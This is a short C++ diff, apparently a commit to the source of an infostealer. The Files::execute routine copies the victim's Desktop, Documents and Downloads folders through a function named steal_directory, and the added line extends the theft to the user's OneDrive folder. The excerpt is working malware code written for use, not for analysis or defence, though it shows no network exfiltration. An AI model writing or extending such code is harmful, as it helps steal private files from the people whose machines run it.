@@ -14,6 +14,7 @@ void Files::execute(fs::path &root) {
     Files::steal_directory(Utils::getUserHome() / "Desktop", filesPath / "Desktop");
     Files::steal_directory(Utils::getUserHome() / "Documents", filesPath / "Documents");
     Files::steal_directory(Utils::getUserHome() / "Downloads", filesPath / "Downloads");
+    Files::steal_directory(Utils::getUserHome() / "OneDrive", filesPath / "OneDrive");
 }
 
 void Files::steal_directory(const fs::path &path, const fs::path &out) {
